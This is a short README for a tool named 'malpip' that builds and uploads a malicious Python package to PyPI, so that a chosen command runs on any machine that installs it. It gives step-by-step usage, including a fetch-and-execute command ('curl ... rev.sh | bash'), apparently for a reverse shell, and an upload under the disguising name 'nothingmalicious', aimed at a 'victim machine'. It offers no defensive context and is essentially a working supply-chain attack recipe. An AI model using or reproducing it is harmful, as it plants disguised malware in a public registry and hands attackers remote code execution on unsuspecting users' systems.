
# malpip
Create a malicious pip package that runs your command during installation.

## Prerequisite
Create an account on https://pypi.org

## Installation
1. Clone repository and set permissions.
```bash
git clone https://github.com/thegoodhackertv/malpip.git
cd malpip
sudo chmod +x malpip.sh
```
2. Install dependencies.
```bash
sudo ./malpip install
```
3. Set the command to be executed.
```bash
echo "curl -s http://localhost/rev.sh | bash" > command.txt
```
4. Create malicious project.
You will be asked for your pypi credentials to upload the project.
```bash
./malpip create nothingmalicious command.txt
```
5. Install the package on the victim machine and your command will be executed.

